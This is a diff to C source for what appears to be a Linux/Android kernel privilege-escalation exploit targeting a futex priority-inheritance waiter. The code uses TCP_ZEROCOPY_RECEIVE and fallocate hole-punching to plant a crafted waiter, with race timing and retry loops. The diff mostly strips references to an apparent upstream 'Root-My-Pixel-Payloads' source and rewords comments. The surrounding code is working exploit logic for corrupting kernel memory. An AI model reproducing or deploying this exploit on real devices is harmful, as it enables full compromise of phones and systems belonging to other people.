@@ -12,10 +12,9 @@ extern int pselect_custom_write;
 int route_last_step;
 int route_last_errno;
 
-/* ---- TCP zerocopy route (Root-My-Pixel-Payloads src/61/fops.c do_tcp_fake_lock_route) ----
- * The only device-proven 6.1 transport. getsockopt(TCP_ZEROCOPY_RECEIVE)
- * parks a frame whose zc words overlap the stale futex waiter: zc[0x28]
- * becomes waiter->task, zc[0x30] waiter->lock. */
+/* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
+ * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
+ * waiter->lock. */
 #define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
 #define TCP_ROUTE_ATTEMPTS 2000
 #define TCP_ARM_SEQ 16
@@ -111,8 +110,8 @@ static void *tcp_punch_thread(void *arg) {
     if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                   (off_t)state->page_size,
                   TCP_PUNCH_SHMEM_LEN - state->page_size) != 0) {
-      /* without the hole the target page keeps its stale contents and the
-       * zerocopy write no longer lands as zeros */
+      /* without the hole the target page keeps stale contents and the
+       * zerocopy write misses */
       atomic_store(&tcp_punch_failed, errno ? errno : EIO);
       pr_warning("tcp punch hole errno=%d\n", errno);
     }
@@ -186,12 +185,10 @@ void do_tcp_fake_lock_route(void) {
   }
   puncher_started = 1;
 
-  /* Root-My-Pixel-Payloads MAIN_TCP_PAYLOAD=1: the waiter->task word carries the phys
-   * alias of init_task, not the image address. */
+  /* waiter->task carries init_task's phys alias, not the image address */
   uintptr_t waiter_task = SLIDE_INIT_TASK;
   int arm_seq = TCP_ARM_SEQ;
   int post_hold = TCP_POST_GETSOCKOPT_HOLD;
-  /* knobs from Root-My-Pixel-Payloads src/61, hardcoded to proven defaults */
 
   pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
           "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
@@ -199,7 +196,7 @@ void do_tcp_fake_lock_route(void) {
           TCP_ROUTE_ATTEMPTS, arm_seq, post_hold);
 
   atomic_store(&tcp_punch_go, 1);
-  /* Custom-write mode: fire the PI walk immediately (delay 0, per Root-My-Pixel-Payloads). */
+  /* custom-write mode: fire the PI walk immediately */
   atomic_store(&main_route_delay_usec, 0);
 
   char sendbuf[64];
@@ -237,9 +234,8 @@ void do_tcp_fake_lock_route(void) {
     int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc,
                          &len);
     int saved_errno = errno;
-    /* Arm barrier: release the consumer only once the zerocopy write has
-     * landed in the waiter frame. Releasing earlier lets sched_setattr walk
-     * a half-written waiter and the attempt misses. */
+    /* release the consumer only once the zerocopy write landed in the
+     * waiter frame; earlier release walks a half-written waiter */
     if (i >= arm_seq && ret == 0) {
       atomic_store(&punch_consume_go, i);
       for (int spin = 0; spin < post_hold; spin++) {
@@ -258,8 +254,8 @@ void do_tcp_fake_lock_route(void) {
       }
       continue;
     }
-    /* Consumer fired = the PI walk derefed the crafted waiter and wrote.
-     * Ghostlock stages verify their own effects; no cfi stage here. */
+    /* consumer fired: the PI walk derefed the crafted waiter and wrote.
+     * stages verify their own effects; no cfi stage here. */
     route_ok = 1;
     route_last_step = 0;
     route_last_errno = 0;
@@ -516,7 +512,7 @@ void do_pselect_fake_lock_route(void) {
     };
     ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
   } else {
-    /* 6.6: select() with the proven {0, 200ms} window (unchanged). */
+    /* 6.6: select() with a {0, 200ms} timeout. */
     struct timeval timeout = {
       .tv_sec = PSELECT_TIMEOUT_SEC,
 #ifdef PSELECT_TIMEOUT_USEC
